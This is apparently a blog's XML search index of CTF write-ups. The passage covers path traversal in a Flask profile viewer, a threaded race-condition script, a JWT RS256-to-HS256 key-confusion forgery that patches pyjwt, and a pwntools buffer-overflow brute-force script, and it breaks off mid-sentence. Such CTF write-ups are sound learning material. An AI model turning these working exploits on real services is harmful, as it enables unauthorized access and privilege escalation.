<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PwnMe CTF CTF Quals 2025 - ProfileEditor (WEB)</title>
      <link href="/250304-pwnmectf2025-profileeditor/"/>
      <url>/250304-pwnmectf2025-profileeditor/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2658">https://ctftime.org/event/2658</a></li></ul><p>I couldnâ€™t get the remote flag because I solved it from local after the CTF ended. However, I solved it correctly and got the local flag, so Iâ€™m sharing how to access and solve it.</p><p>The challenge provided the full source code, making it a white-box web challenge written in Python using Flask.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>There were 4 endpoints:</p><ul><li><code>/login</code>: Logs in with a username and password, creating a session.</li><li><code>/register</code>: Creates an account with a username and password.</li><li><code>/profile</code>: Allows users to view and edit their profile.</li><li><code>/show_profile</code>: Displays the profile without allowing edits.</li></ul><p>The most interesting endpoint was <code>/show_profile</code>, as it read the profile directly from a file. Since there was a <code>flag.txt</code> file on the server, I wanted to exploit it to read the flag using the <code>/show_profile</code> endpoint.</p><p>I didnâ€™t use <code>/profile</code> because, even though it also reads profile files, it appends <code>.html</code> to the username when reading the file. So, if my username were <code>flag.txt</code>, it would attempt to read <code>flag.txt.html</code> instead. You can see this behavior in the implementation below:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">profiles_file = <span class="string">&#x27;profile/&#x27;</span> + session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">profiles_file = profiles_file <span class="keyword">if</span> profiles_file.endswith(<span class="string">&#x27;.html&#x27;</span>) <span class="keyword">else</span> profiles_file + <span class="string">&#x27;.html&#x27;</span></span><br><span class="line"></span><br><span class="line">profile=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> exists(profiles_file):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(profiles_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        profile = f.read()</span><br></pre></td></tr></table></figure><p>Now, letâ€™s take a look at <code>/show_profile</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show_profile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_profile</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    profiles_file = <span class="string">&#x27;profile/&#x27;</span> + session.get(<span class="string">&#x27;username&#x27;</span>) <span class="comment"># [1]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> commonpath((app.root_path, abspath(profiles_file))) != app.root_path:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, msg=<span class="string">&#x27;Error processing profile file!&#x27;</span>, return_to=<span class="string">&#x27;/profile&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    profile = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> exists(profiles_file): <span class="comment"># [2]</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(profiles_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            profile = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;show_profile.html&#x27;</span>, username=session.get(<span class="string">&#x27;username&#x27;</span>), profile=profile)</span><br></pre></td></tr></table></figure><p>Since the file it reads depends on the username, if the file exists, you can read it. However, as seen in [1], <code>profiles_file</code> is formatted as <code>profile/username</code>, meaning you need to use <code>../</code> to climb up directories. Since <code>flag.txt</code> is not in the <code>profile</code> directory. This is known as <code>Path Traversal</code>.</p><h2 id="Solution-Summary"><a href="#Solution-Summary" class="headerlink" title="Solution Summary"></a>Solution Summary</h2><ol><li>Register and Log in with the username <code>../flag.txt</code>.</li><li>Access <code>/show_profile</code>, and it will display the contens of <code>flag.txt</code>.</li></ol>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> PwnMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> Path Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apoorv CTF 2025 Write ups - SEO CEO, Blog-1, Tan-je-ro (WEB)</title>
      <link href="/250302-apoorvctf2025-WEB/"/>
      <url>/250302-apoorvctf2025-WEB/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2638">https://ctftime.org/event/2638</a></li></ul><h2 id="SEO-CEO-289-Solves"><a href="#SEO-CEO-289-Solves" class="headerlink" title="SEO CEO (289 Solves)"></a>SEO CEO (289 Solves)</h2><p>Title: SEO CEO<br>Description: Theyâ€™re optimizing SEO to show this garbage?!</p><p>This was a black box challenge. At first, I tried to check <code>/robots.txt</code>, but it had a fake flag.</p><p>Based on the title and description of this challenge, I checked <code>/sitemap.xml</code>. It contained XML code, and the main part is below.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;url&gt;</span><br><span class="line">&lt;loc&gt;https://www.thiswebsite.com/goofyahhroute&lt;/loc&gt;</span><br><span class="line">&lt;lastmod&gt;2025-02-26&lt;/lastmod&gt;</span><br><span class="line">&lt;changefreq&gt;never&lt;/changefreq&gt;</span><br><span class="line">&lt;priority&gt;0.0&lt;/priority&gt;</span><br><span class="line">&lt;/url&gt;</span><br></pre></td></tr></table></figure><p>I accessed <code>/goofyahhroute</code>, and there was a simple black sentence on a white background.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ok bro u da seo master gng frfr ngl no cap</span><br><span class="line">but do you really want the &quot;flag&quot;?</span><br><span class="line">come on blud, it&#x27;s a yes or no question</span><br><span class="line">yeah?</span><br></pre></td></tr></table></figure><p>So, I checked the source code and found one sentence that looked like a hint.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tell it to the url then blud</span><br></pre></td></tr></table></figure><p>I ended up getting the flag by accessing the URL below.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goofyahhroute?flag=yes</span><br></pre></td></tr></table></figure><h2 id="Blog-1-60-Solves"><a href="#Blog-1-60-Solves" class="headerlink" title="Blog-1 (60 Solves)"></a>Blog-1 (60 Solves)</h2><p>Title: Blog-1<br>Description: In the digital realm, Blog-1 awaited brave developers. The mission? Craft a captivating blog with enchanting posts, lively comments, and secure user authentication. Create a functional and visually stunning masterpiece. Ready for the Blog-1 adventure?</p><p>This was also a black box challenge.</p><p>There were several functions interacting with the server:</p><ol><li>Register&#x2F;login</li><li>Create a new blog post: title, description</li><li>Check blog rewards</li></ol><p>To get the flag, there were two interesting points:</p><ol><li>You can create one blog post per day.</li><li>If you write five posts, you will get a flag according to the blog rewards. After creating the first post and checking the blog rewards, it says that if you write four more posts, you can get a gift.</li></ol><p>The first thing that came to my mind was to successfully create five posts almost at the same time. So, I used <code>threading</code> in Python because if you use <code>requests</code> and send five requests in a for loop, the second response will wait until the first response arrives.</p><p>I used an AWS server from India to reduce response time. When I checked the ping of this challenge, it was located in India.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">characters = string.ascii_letters + string.digits</span><br><span class="line">email = <span class="string">&#x27;&#x27;</span>.join(random.choices(characters, k=<span class="number">8</span>))</span><br><span class="line">email = email + <span class="string">&#x27;@aaa.com&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(email)</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://chals1.apoorvctf.xyz:5001/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(URL+<span class="string">&#x27;/api/register&#x27;</span>, json=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;aabbcc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;email&quot;</span>:email,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;jir4vvit&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">res = requests.post(URL+<span class="string">&#x27;/api/login&#x27;</span>, json=&#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>:email,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;jir4vvit&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">token = res.json().get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>(<span class="params">i</span>):</span><br><span class="line">    res = requests.post(URL+<span class="string">&#x27;api/v1/blog/addBlog&#x27;</span>, json=&#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="string">&quot;sssssss&quot;</span>,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&#x27;aaaaaaa&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;visible&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;date&quot;</span>:<span class="string">&quot;2025-03-01T21:41:49.509Z&quot;</span></span><br><span class="line">    &#125;, headers=&#123;</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Request <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: Response: <span class="subst">&#123;res.json()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    t = threading.Thread(target=send_request, args=(i,))</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><p>I ran this code on the AWS server from India and ended up getting a reward! But it wasnâ€™t the flag. To figure it out, I checked the sitemap in Burp Suite. <code>/api/v2/gift</code> and <code>/api/v1/blog/addBlog</code> caught my attention. So, I tried <code>/api/v1/gift</code>, and then I got the flag.</p><h2 id="Tan-je-ro-33-Solves"><a href="#Tan-je-ro-33-Solves" class="headerlink" title="Tan-je-ro (33 Solves)"></a>Tan-je-ro (33 Solves)</h2><p>Title: Tan-je-ro<br>Description: Bruh, Tanjiro messed up BIG TIME. ðŸ˜­ He hid Gokuâ€™s summoning scroll somewhere on this cursed website, and now itâ€™s all broken. ðŸ’€ If we donâ€™t find it fast, Gokuâ€™s never showing up, and weâ€™re all doomed. No cap, this might be the hardest quest yet. Think you got what it takes? ðŸ‘€ðŸ”¥ Can you wield your skills like Tanjiroâ€™s blade and break through the encrypted defenses?<br>Hint: Dont remove the headers from the public key :)</p><p>This was a black box challenge, and I couldnâ€™t get anything when I first tried to solve it. But it turned out that a hint came, so I was able to solve it using that hint.</p><p>After finding some endpoints, I found <code>/login</code>, <code>/Admin</code>, and <code>/public</code>:</p><ul><li><code>/login</code>: You can get a token to explore.</li><li><code>/Admin</code>: You need a token to continue.</li><li><code>/public</code>: You can get a public key.</li></ul><p>To contine solving, I had to access to <code>/Admin</code> with token that I could get from <code>/login</code>. This shape was like below. Itâ€™s a typcial JWT token.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJHdWVzdCIsImlhdCI6MTc0MDkyODQxM30.ZMeqC1m7Zf3UNICbBHnhqS82HK2h646HE9P_QE8pa3ZC4KVzl3og5O5RdkcFg_MkwgPpadKBmYkyQl_gGJvXkYFqA2Cfqc7IerbPWlFOVOit9I_cznLhDt497Ggge4TkRKRXVHPSITog5j3k-ULnbPQZqagqsz5XOwOPLu_T34dFGyf-lCnwryuCVE49Fh-LtgWtxxiZ2tUPa8r5Sk3dHOQHWT4RSxnwzmnYmsJGrjY7EKdwqLY55akxPBlutzo3dkSZWYQk_tZQyqJDqTAXN0gjKo3sxEQpKlCUts3XY4mGLafxnZSmoqa2qYsHhjN82dIKlQnAXk9MH6RCLz-0MA</span><br></pre></td></tr></table></figure><p>I decoded the header and payload.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;admin&quot;: false,</span><br><span class="line">  &quot;name&quot;: &quot;Guest&quot;,</span><br><span class="line">  &quot;iat&quot;: 1740928413</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>At first, I tried to change <code>token[&#39;admin&#39;]</code> from False to True and change <code>token[&#39;name&#39;]</code> to <code>/Admin</code>, but it didnâ€™t work.</p><p>Based on the hint, I had to use the public key to solve this problem, and it was suggested not to remove the public key. So, I changed the algorithm when encoding the JWT token. However, when using the <code>HS256</code> algorithm, I couldnâ€™t use the public key as the key. I could only use plain text as the key. So, I had to modify the source code in <code>pyjwt</code>.</p><p>Below was the traceback when I tried to encode the JWT token with the <code>HS256</code> algorithm using the public key.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/Users/user/tmp/tanjero/2.py&quot;, line 29, in &lt;module&gt;</span><br><span class="line">    token = jwt.encode(data, public_key, algorithm=&quot;HS256&quot;)</span><br><span class="line">  File &quot;/opt/homebrew/lib/python3.13/site-packages/jwt/api_jwt.py&quot;, line 78, in encode</span><br><span class="line">    return api_jws.encode(</span><br><span class="line">           ~~~~~~~~~~~~~~^</span><br><span class="line">        json_payload,</span><br><span class="line">        ^^^^^^^^^^^^^</span><br><span class="line">    ...&lt;4 lines&gt;...</span><br><span class="line">        sort_headers=sort_headers,</span><br><span class="line">        ^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">    )</span><br><span class="line">    ^</span><br><span class="line">  File &quot;/opt/homebrew/lib/python3.13/site-packages/jwt/api_jws.py&quot;, line 170, in encode</span><br><span class="line">    key = alg_obj.prepare_key(key)</span><br><span class="line">  File &quot;/opt/homebrew/lib/python3.13/site-packages/jwt/algorithms.py&quot;, line 259, in prepare_key</span><br><span class="line">    raise InvalidKeyError(</span><br><span class="line">    ...&lt;2 lines&gt;...</span><br><span class="line">    )</span><br><span class="line">jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</span><br></pre></td></tr></table></figure><p>According to the traceback, I had to bypass <code>prepare_key</code> in order to encode with the public key. So, I commented it out.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /jwt/algorithms.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_key</span>(<span class="params">self, key: <span class="built_in">str</span> | <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    key_bytes = force_bytes(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#if is_pem_format(key_bytes) or is_ssh_key(key_bytes):</span></span><br><span class="line">    <span class="comment">#    raise InvalidKeyError(</span></span><br><span class="line">    <span class="comment">#        &quot;The specified key is an asymmetric key or x509 certificate and&quot;</span></span><br><span class="line">    <span class="comment">#        &quot; should not be used as an HMAC secret.&quot;</span></span><br><span class="line">    <span class="comment">#    )</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_bytes</span><br></pre></td></tr></table></figure><p>And it worked! I finally got the flag! Below is the final exploit code.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;https://tan-je-ro.onrender.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(URL+<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">token = re.findall(<span class="string">r&#x27;&lt;code.*?&gt;(.*?)&lt;/code&gt;&#x27;</span>, res.text, re.DOTALL)</span><br><span class="line">token = token[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line">public_key = <span class="string">&#x27;&#x27;&#x27;-----BEGIN RSA PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBCgKCAQEAwcMU3Y6CQyvA87vJRKZomubiceep9YlNdp6y95ICIZ3y7jV3oZyt</span></span><br><span class="line"><span class="string">b1zfwFJ1p/pdTd7ckOOQVsP6/Y7g6gLa9S8YZmKzy7jU6EnV2XPnXTF287hXasup</span></span><br><span class="line"><span class="string">OzLd4iAzRw12r9pIQ/Fjum8pQ2LzWEaAmuHfkm1o3C9i8ZsbfvZIw/tAB/qEfh34</span></span><br><span class="line"><span class="string">dGoVvPsJawF44oEFkAQYlS40FmM1EkNzNmNPtKUXlRrr0be0PTCshUbX7VpGC0b1</span></span><br><span class="line"><span class="string">9JKb/vB+KGye6yUjLwHKKUHZedHQFMMV9OayOwWSnP9J+9Tq77qyNSeBe6vy6uD1</span></span><br><span class="line"><span class="string">XPm0mfmUYLJZKy0XqjHHxOB9DjKaecmMoQIDAQAB</span></span><br><span class="line"><span class="string">-----END RSA PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = jwt.decode(token, public_key, algorithms=[<span class="string">&quot;RS256&quot;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded JWT:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line">data[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">data[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;Admin&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">token = jwt.encode(data, public_key, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;JWT Token:&quot;</span>, token)</span><br><span class="line"></span><br><span class="line">res = requests.get(URL+<span class="string">f&#x27;/Admin?token=<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Apoorv </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1337UP LIVE CTF 2023 Write ups</title>
      <link href="/231122-1337upctf2023-PWN/"/>
      <url>/231122-1337upctf2023-PWN/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2134">https://ctftime.org/event/2134</a></li></ul><h2 id="Hidden-111-solves-x2F-100-points"><a href="#Hidden-111-solves-x2F-100-points" class="headerlink" title="Hidden (111 solves &#x2F; 100 points)"></a>Hidden (111 solves &#x2F; 100 points)</h2><blockquote><p>Not everything you see is what it appears to be! Can you find the hidden secrets and beat it?<br>Author: 0xM4hm0ud<br>hidden.ctf.intigriti.io 1337</p></blockquote><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>Simple buffer overflow. Letâ€™s return to <code>get_flag</code>.</p><p>But They have PIE, so I need to brute force only 0.5 byte.</p><p>Remember that the read function does not need to include â€˜\nâ€™.</p><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x11Da</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;hidden2.ctf.intigriti.io&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span>  <span class="comment"># rbp</span></span><br><span class="line">        payload += <span class="string">b&#x27;\xda\xc1&#x27;</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recvuntil(<span class="string">&#x27;INTIGRITI&#123;&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">            flag = p.recvline()</span><br><span class="line">            info(<span class="string">b&#x27;INTIGRITI&#123;&#x27;</span> + flag)</span><br><span class="line">            p.interactive()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(ex)</span><br></pre></td></tr></table></figure><h2 id="Over-The-Edge-110-solves-x2F-100-points"><a href="#Over-The-Edge-110-solves-x2F-100-points" class="headerlink" title="Over The Edge (110 solves &#x2F; 100 points)"></a>Over The Edge (110 solves &#x2F; 100 points)</h2><blockquote><p>Numbers are fun!! ðŸ”¢<br>Author: kavigihan<br>edge.ctf.intigriti.io 1337</p></blockquote><h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>Here is the key function in the given script.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_input</span>(<span class="params">input_value</span>):</span><br><span class="line">    num1 = np.array([<span class="number">0</span>], dtype=np.uint64)</span><br><span class="line">    num2 = np.array([<span class="number">0</span>], dtype=np.uint64)</span><br><span class="line">    num2[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    a = input_value</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">if</span> a &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Exiting...&quot;</span></span><br><span class="line">    num1[<span class="number">0</span>] = (a + <span class="number">65</span>)</span><br><span class="line">    <span class="built_in">print</span>((num2[<span class="number">0</span>] - num1[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">if</span> (num2[<span class="number">0</span>] - num1[<span class="number">0</span>]) == <span class="number">1337</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You won!\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Try again.\n&#x27;</span></span><br></pre></td></tr></table></figure><p>When this function return â€˜You won!\nâ€™, I can get the flag.</p><h3 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h3><p>I just asked to ChatGPT and got the answer.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">When representing a negative value like -1402 in an unsigned 64-bit integer (np.uint64 in the context of NumPy), you use the two&#x27;s complement.</span><br><span class="line"></span><br><span class="line">The two&#x27;s complement of a number is found by subtracting the number from 2^64. So for -1402:</span><br><span class="line"></span><br><span class="line">Twoâ€™s complement = 2^64 âˆ’1402</span><br><span class="line"></span><br><span class="line">Calculating this gives:</span><br><span class="line"></span><br><span class="line">Twoâ€™s complement = 18446744073709550214</span><br><span class="line"></span><br><span class="line">Therefore, when representing -1402 as an unsigned 64-bit 